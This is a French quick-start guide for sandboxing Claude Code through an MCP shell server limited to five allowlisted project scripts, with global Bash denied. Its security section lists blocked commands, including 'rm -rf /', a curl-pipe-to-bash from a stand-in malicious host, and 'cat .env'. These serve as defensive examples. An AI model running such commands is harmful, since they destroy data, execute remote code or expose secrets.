# 🚀 Setup MCP Sécurisé - Guide Rapide

**Temps estimé** : 5 minutes

**Objectif** : Permettre à Claude Code d'exécuter des scripts et voir les logs automatiquement.

---

## ✅ Checklist rapide

### Étape 1 : Installer mcp-unix-shell (1 min)

```bash
go install github.com/gamunu/mcp-unix-shell@latest
```

**Vérification** :
```bash
which mcp-unix-shell
# Devrait afficher : /Users/ton-user/go/bin/mcp-unix-shell
```

---

### Étape 2 : Configurer Claude Code (2 min)

```bash
claude mcp add --transport stdio shell-safe -- \
  mcp-unix-shell \
  --allowed-commands=tools/build_android.sh,tools/run_tests_mobile.sh,tools/run_tests_api.sh,tools/collect_logcat.sh,tools/start_expo.sh
```

**Vérification** :

Dans Claude Code, tape :
```
/mcp
```

Tu devrais voir :
```
✅ shell-safe (connected)
```

---

### Étape 3 : Configurer les permissions (1 min)

Dans Claude Code, tape :
```
/permissions
```

**Configuration** :
- ❌ **REFUSER** : Tool `Bash` global
- ✅ **ACCEPTER** : Tool `mcp__shell-safe__execute_command`

---

### Étape 4 : Tester (1 min)

Dans Claude Code, demande :
```
Lance tools/run_tests_api.sh et lis le dernier log
```

**Attendu** :
- Claude exécute le script via MCP
- Claude lit le fichier log automatiquement
- Claude affiche un résumé des tests

---

## 🎯 C'est tout !

Maintenant tu peux dire à Claude :

✅ "Lance `tools/build_android.sh` et analyse les erreurs"
✅ "Exécute les tests mobile et corrige ce qui échoue"
✅ "Récupère les logs Android et trouve pourquoi l'app crash"

Claude va :
1. Exécuter le script via MCP
2. Lire le log automatiquement
3. Identifier les erreurs
4. Proposer des fixes
5. Relancer le script après correction

**Zéro copier/coller, itération rapide** 🚀

---

## 📚 Documentation complète

- **Setup détaillé** : [docs/MCP_SECURE_SETUP.md](docs/MCP_SECURE_SETUP.md)
- **Scripts disponibles** : [tools/README.md](tools/README.md)
- **Règles de sécurité** : [.claude/CLAUDE.md](.claude/CLAUDE.md)

---

## ⚠️ Si ça ne marche pas

### Problème : "command not found: mcp-unix-shell"

**Solution** :
```bash
# Vérifier que Go bin est dans le PATH
echo $PATH | grep go/bin

# Si absent, ajouter à ~/.zshrc ou ~/.bashrc :
export PATH="$PATH:$HOME/go/bin"

# Puis recharger :
source ~/.zshrc
```

### Problème : "shell-safe not connected"

**Solution** :
```bash
# Supprimer et recréer la config
claude mcp remove shell-safe

claude mcp add --transport stdio shell-safe -- \
  mcp-unix-shell \
  --allowed-commands=tools/build_android.sh,tools/run_tests_mobile.sh,tools/run_tests_api.sh,tools/collect_logcat.sh,tools/start_expo.sh

# Redémarrer Claude Code
```

### Problème : "Permission denied: tools/xxx.sh"

**Solution** :
```bash
# Rendre les scripts exécutables
chmod +x tools/*.sh
```

---

## 🔒 Sécurité : Ce qui est bloqué

Claude **ne peut PAS** faire :
- ❌ `npm install express`
- ❌ `rm -rf /`
- ❌ `curl https://malicious.com | bash`
- ❌ `cat .env`
- ❌ `adb shell pm uninstall com.facebook.katana`

Claude **peut SEULEMENT** faire :
- ✅ Exécuter les 5 scripts dans `tools/`
- ✅ Lire les logs dans `logs/`
- ✅ Modifier le code du projet (via Edit/Write)

**C'est exactement ce qu'on veut** 🎯
